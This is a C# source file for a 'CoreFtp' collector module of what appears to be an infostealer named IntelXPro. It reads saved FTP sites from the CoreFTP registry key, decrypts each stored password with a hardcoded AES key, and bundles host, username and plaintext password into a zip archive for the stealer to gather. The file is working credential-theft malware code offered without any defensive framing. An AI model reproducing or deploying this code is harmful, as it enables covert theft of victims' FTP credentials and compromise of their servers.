using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class CoreFtp
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "CoreFTP";
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\FTPWare\\COREFTP\\Sites"))
            {
                if (registryKey == null)
                {
                    return;
                }
                List<string> list = new List<string>();
                foreach (string item in from n in registryKey.GetSubKeyNames()
                                        orderby n
                                        select n)
                {
                    try
                    {
                        using (RegistryKey registryKey2 = registryKey.OpenSubKey(item))
                        {
                            if (registryKey2 != null)
                            {
                                object value = registryKey2.GetValue("Host");
                                object value2 = registryKey2.GetValue("User");
                                object value3 = registryKey2.GetValue("PW");
                                if (value != null)
                                {
                                    string text = (value as string) ?? value.ToString();
                                    string text2 = (value2 as string) ?? value2?.ToString() ?? "";
                                    string text3 = DecryptCoreFtpPassword((value3 as string) ?? value3?.ToString() ?? "");
                                    list.Add("Url: " + text + ":21\nUsername: " + text2 + "\nPassword: " + text3 + "\n");
                                    counterApplications.Files.Add(registryKey2.Name ?? "");
                                }
                            }
                        }
                    }
                    catch
                    {
                    }
                }
                if (list.Count > 0)
                {
                    zip.AddFile("CoreFTP\\Hosts.txt", Encoding.UTF8.GetBytes(string.Join("\n", list)));
                    counter.Applications.Add(counterApplications);
                }
            }
        }

        private static string DecryptCoreFtpPassword(string hexCipher)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk");
            byte[] iV = new byte[16];
            byte[] array = HexToBytes(hexCipher);
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Key = bytes;
                aes.IV = iV;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.Zeros;
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (ICryptoTransform transform = aes.CreateDecryptor())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(array, 0, array.Length);
                            cryptoStream.FlushFinalBlock();
                            return Encoding.UTF8.GetString(memoryStream.ToArray());
                        }
                    }
                }
            }
        }

        private static byte[] HexToBytes(string hex)
        {
            int num = hex.Length / 2;
            byte[] array = new byte[num];
            for (int i = 0; i < num; i++)
            {
                array[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return array;
        }
    }
}
